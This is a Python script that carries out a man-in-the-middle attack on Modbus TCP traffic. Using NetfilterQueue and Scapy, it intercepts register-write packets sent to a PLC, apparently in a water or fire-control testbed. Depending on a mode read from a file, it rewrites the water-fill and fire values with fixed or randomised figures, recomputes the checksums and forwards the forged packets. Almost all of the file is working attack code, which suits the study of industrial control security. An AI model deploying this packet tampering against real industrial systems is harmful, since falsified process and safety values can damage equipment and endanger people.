import random
import NetworkEncoder as ne
from netfilterqueue import NetfilterQueue
from pymodbus.client.sync import ModbusTcpClient
from scapy.all import *

MODBUS_SLAVE = '10.10.3.101'

random.seed(100)
response = ''

# convert string to hex
def toHex(s):
    lst = []
    for ch in s:
        hv = hex(ord(ch)).replace('0x', '')
        if len(hv) == 1:
            hv = '0' + hv
        lst.append(hv)

    return reduce(lambda x, y: x + y, lst)

def plx(x):
    val = int(x, 16)
    return chr(val)

def runAttack(response, pkt):
    sc_pkt = IP(pkt.get_payload())
    ip_hex = toHex(str(sc_pkt))

    print(sc_pkt[IP].dst)
    print(sc_pkt[TCP].dport)
    print(ip_hex[118:132])
    if sc_pkt[IP].dst == MODBUS_SLAVE and sc_pkt[TCP].dport == 502 and ip_hex[118:120] == '10' and ip_hex[128:130] == '06':
        registers = []
        for i in range(0, 3):
            index = 130 + (4 * i)
            registers.append(int(ip_hex[index:index + 4], 16))

        addWater = ne.modbusDecode(0, 2, 2, registers)
        addFire = ne.modbusDecode(2, 2, 0, registers)

        print(addWater, addFire)
        response = int(response)
        if response == 1:
            # 1,500L constant fill, no fire
            addWater = 1500
            addFire = 0
        if response == 2:
            #1,500L constant fill, current fire state
            addWater = 1500
        if response == 3:
            # 1,500L constant fill +- 10%, current fire state
            addWater = 1500 * (random.randint(90, 110) / 100)
        if response == 4:
            # Add water value + 0-5%, if no fire, + 5-10% if fire
            if addFire:
                addWater = 500 + (addWater * (random.randint(105, 110) / 100))
            else:
                addWater = 500 + (addWater * (random.randint(100, 105) / 100))

        outputs = []
        outputs = ne.modbusEncode(addWater, 2, 2, outputs)
        outputs = ne.modbusEncode(addFire, 2, 0, outputs)

        print(outputs)

        payload = ""

        for reg in outputs:
            add = str(hex(reg))[2:]
            for x in range(len(add), 4):
                add = '0' + str(add)
            payload += plx(add[0:2]) + plx(add[2:4])

        print(toHex(sc_pkt[Raw].load))
        sc_pkt[Raw].load = sc_pkt[Raw].load[0:13] + payload
        print(toHex(sc_pkt[Raw].load))
        sc_pkt[IP].ttl -= 1
        del sc_pkt[IP].chksum
        del sc_pkt[TCP].chksum
        sc_pkt.show2()
        pkt.set_payload(str(sc_pkt))
        pkt.accept()
    else:
        pkt.accept()

def mitm(pkt):
    f = open("CIAMode.txt")
    mode = f.readline()
    #print "[" + mode + "]"

    if mode != 'n':
        runAttack(mode, pkt)
    else:
        #print(len(pkt.get_payload()))
        pkt.accept()
    f.close()

nfqueue = NetfilterQueue()
nfqueue.bind(1, mitm)

try:
    nfqueue.run()
except KeyboardInterrupt:
    print('')

nfqueue.unbind()
